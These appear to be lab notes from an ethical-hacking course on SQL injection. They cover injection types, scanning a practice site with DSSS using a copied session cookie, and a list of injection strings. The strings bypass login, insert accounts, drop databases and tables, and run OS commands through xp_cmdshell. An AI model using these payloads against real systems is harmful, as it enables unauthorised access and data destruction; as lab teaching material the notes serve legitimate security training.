SQL injection attacks can be performed using various techniques to view, manipulate, insert, and delete data from an applicationâ€™s
database. There are three main types of SQL injection:
In-band SQL injection: An attacker uses the same communication channel to perform the attack and retrieve the results

Blind/inferential SQL injection: An attacker has no error messages from the system with which to work, but rather simply
sends a malicious SQL query to the database

Out-of-band SQL injection: An attacker uses different communication channels (such as database email functionality, 
or file writing and loading functions) to perform the attack and obtain the results
-------------------------------------------
Damn Small SQLi Scanner (DSSS) is a fully functional SQL injection vulnerability scanner that supports GET and POST parameters. 
DSSS scans web applications for various SQL injection vulnerabilities.

Here, we will use DSSS to detect SQL injection vulnerabilities in a web application.

-------------------------Detect SQL Injection Vulnerabilities using DSSS----------------
Parrot Terminal window appears. 
>In the terminal window, type sudo su and press Enter to run the programs as a root user.
>Now, type cd and press Enter to jump to the root directory.
>In the MATE Terminal type cd DSSS and press Enter to navigate to the DSSS folder which is alredy downloaded.
>In the terminal window, type python3 dsss.py and press Enter to view a list of available options in the DSSS application
>Now, minimize the Terminal window and click on the Firefox icon in the top section of Desktop to launch Firefox.
>In the Mozilla Firefox window, type http://www.<site>.com/ in the address bar and press Enter. 
A Login page loads; enter the Username and Password as sam and test, respectively. Click the Login button.
>Once you are logged into the website, click the View Profile tab from the menu bar; 
and when the page has loaded, make a note of the URL in the address bar of the browser.

>Right-click anywhere on the webpage and click Inspect Element (Q) from the context menu
>The Developer Tools frame appears in the lower section of the browser window. 
Click the Console tab, type document.cookie in the lower-left corner of the browser, and press Enter.
>Select the cookie value, then right-click and copy it, . Minimize the web browser.

>Switch to a terminal window and type python3 dsss.py -u "http://www.<site>.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied]" 
and press Enter.
In this command, -u specifies the target URL and --cookie specifies the HTTP cookie header value.
The above command causes DSSS to scan the target website for SQL injection vulnerabilities.
The result appears, showing that the target website (www.<site>.com) is vulnerable to blind SQL injection attacks. 
The vulnerable link is also displayed, as shown in the screenshot.

>Highlight the vulnerable website link from the parrot terminal, right-click it, and, from the options, click Copy.
>Switch to Mozilla Firefox; in a new tab, paste the copied link in the address bar and press Enter.
>You will observe that information regarding all the available user accounts appears under the View Profile tab.
Scroll down to view the user account information for all users.
--------------------------------------------------------END-------------------------------------


----------------------------Detect SQL Injection Vulnerabilities using OWASP ZAP (Windows)-------------------
OWASP Zed Attack Proxy (ZAP) is an integrated penetration testing tool for finding vulnerabilities in web applications. 
It offers automated scanners and a set of tools that allow you to find security vulnerabilities manually. It is designed to be used by people with a wide range of security experience, and as such is ideal for developers and functional testers who are new to penetration testing.

In this task, we will use OWASP ZAP to test a web application for SQL injection vulnerabilities.

------------------------------END-------------------------------

---------------------------------SQL Injection Queries--------------------
~~Logging into the DB
> Click the Type here to search icon in the lower section of Desktop and type microsoft. 
From the results, click Microsoft SQL Server Management Studio 18.
> Microsoft SQL Server Management Studio opens, along with a Connect to Server pop-up. 
In the Connect to Server pop-up, leave the default settings as they are and click the Connect button.
>In the left pane of the Microsoft SQL Server Management Studio window, under the Object Explorer section,
expand the Databases node. From the available options, expand the GoodShopping node, and then the Tables node under it.
>Under the Tables node, right-click the dbo.Login file and click Select Top 1000 Rows from the context menu to view the available credentials.
~~Done


>Click LOGIN on the menu bar and type the query>> 
> blah' or 1=1 -- [By pass authentication]

> blah';insert into login values ('john','apple123'); -- [Create UID/PWD]
After executing the query, to verify whether your login has been created successfully, click the LOGIN tab, 

> blah';create database mydatabase; -- [Create DB mydatabase]

> blah'; DROP DATABASE mydatabase; -- 

> blah'; DROP TABLE table_name; -- 

> blah';exec master..xp_cmdshell 'ping www.certifiedhacker.com -l 65000 -t'; -- 
In the above query, you are pinging the www.certifiedhacker.com website using an SQL injection query. -l is 
the sent buffer size and -t refers to pinging the specific host.
------------------------------------------------END--------------------------------------

